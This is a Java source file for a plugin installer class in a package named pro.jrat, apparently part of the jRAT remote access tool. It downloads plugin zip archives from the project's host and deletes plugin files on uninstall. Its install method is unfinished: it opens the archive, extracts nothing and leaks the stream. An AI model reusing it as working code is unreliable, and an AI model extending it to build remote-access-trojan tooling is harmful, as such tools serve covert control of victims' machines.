package pro.jrat.extensions;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.zip.ZipInputStream;

import pro.jrat.Constants;
import pro.jrat.ErrorDialog;
import pro.jrat.common.utils.IOUtils;
import pro.jrat.net.WebRequest;


public class ExtensionInstaller {

	private OnlinePlugin plugin;

	public ExtensionInstaller(OnlinePlugin plugin) {
		this.plugin = plugin;
	}

	public void toggle() {
		try {
			if (plugin.isInstalled()) {
				uninstall();
			} else {
				install();
			}
		} catch (Exception e) {
			e.printStackTrace();
			ErrorDialog.create(e);
		}
	}

	public void uninstall() throws Exception  {
		plugin.getJar().delete();
		plugin.getDirectory().delete();
	}

	public void install() throws Exception {
		File temp = File.createTempFile(plugin.getName() + "_temp_download", ".zip");
		
		InputStream archive = WebRequest.getInputStream(Constants.HOST + "/plugins/" + plugin.getName() + "/archive.zip");
		FileOutputStream out = new FileOutputStream(temp);
		
		IOUtils.copy(archive, out);
		
		archive.close();
		out.close();
		
		
		ZipInputStream zis = new ZipInputStream(new FileInputStream(temp));
		
		
		temp.delete();
	}

}
